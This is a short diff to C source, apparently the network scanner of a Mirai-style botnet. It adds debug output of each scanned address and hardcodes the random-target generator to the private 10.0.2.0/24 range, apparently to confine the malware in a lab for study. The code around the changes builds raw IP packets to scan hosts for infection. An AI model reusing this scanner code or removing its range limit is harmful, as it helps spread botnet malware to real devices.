@@ -211,6 +211,12 @@ void scanner_init(void)
                 iph->id = rand_next();
                 iph->saddr = LOCAL_ADDR;
                 iph->daddr = get_random_ip();
+#ifdef DEBUG
+                int len=20;
+                char buffer[len];
+                inet_ntop(AF_INET, &(iph->daddr), buffer, len);
+                printf("[scanner] scanning ip: %s\n", buffer);
+#endif
                 iph->check = 0;
                 iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));
 
@@ -708,9 +714,9 @@ static ipv4_t get_random_ip(void)
 //    o4 = (rand_next() >> 24) & 0xff;
 
     // limited to 10.0.2.0/24
-    o1 = 10 & 0xff;
-    o2 = (0 >> 8) & 0xff;
-    o3 = (2 >> 16) & 0xff;
+    o1 = 10;
+    o2 = 0;
+    o3 = 2;
     o4 = (rand_next() >> 24) & 0xff;
 
     return INET_ADDR(o1,o2,o3,o4);
